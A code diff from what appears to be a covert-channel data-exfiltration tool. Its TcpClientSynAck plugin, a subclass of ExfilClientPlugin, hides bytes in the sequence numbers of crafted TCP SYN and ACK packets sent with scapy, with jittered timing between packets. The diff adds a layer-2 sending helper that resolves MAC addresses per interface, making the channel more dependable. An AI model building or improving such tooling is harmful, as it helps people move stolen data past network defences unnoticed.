@@ -1,4 +1,3 @@
-
 from __future__ import annotations
 from typing import Dict, Any, Iterable, Optional
 import time, random
@@ -13,15 +12,33 @@ def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
         t = max(0.0, (base_ms + jitter) / 1000.0)
         time.sleep(t)
 
+def _send_packet(pkt, iface: Optional[str] = None):
+    from scapy.all import send, sendp, Ether, conf, getmacbyip
+    if not iface:
+        send(pkt, verbose=False)
+        return
+
+    old_iface = conf.iface
+    try:
+        conf.iface = iface
+        mac = getmacbyip(pkt.dst)
+    finally:
+        conf.iface = old_iface
+
+    if not mac:
+        raise RuntimeError(f"no se pudo resolver MAC para destino {pkt.dst!r} en iface {iface!r}")
+    sendp(Ether(dst=mac) / pkt, verbose=False, iface=iface)
+
+
 def _send_syn(dst, dport, b: int, iface: Optional[str] = None):
-    from scapy.all import IP, TCP, send, RandShort
+    from scapy.all import IP, TCP, RandShort
     pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='S', seq=SEQ_BASE + (b & 0xFF))
-    send(pkt, verbose=False, iface=iface)
+    _send_packet(pkt, iface=iface)
 
 def _send_ack(dst, dport, b: int, iface: Optional[str] = None):
-    from scapy.all import IP, TCP, send, RandShort
+    from scapy.all import IP, TCP, RandShort
     pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='A', seq=SEQ_BASE + (b & 0xFF), ack=1)
-    send(pkt, verbose=False, iface=iface)
+    _send_packet(pkt, iface=iface)
 
 class TcpClientSynAck(ExfilClientPlugin):
     canal = "TCP"
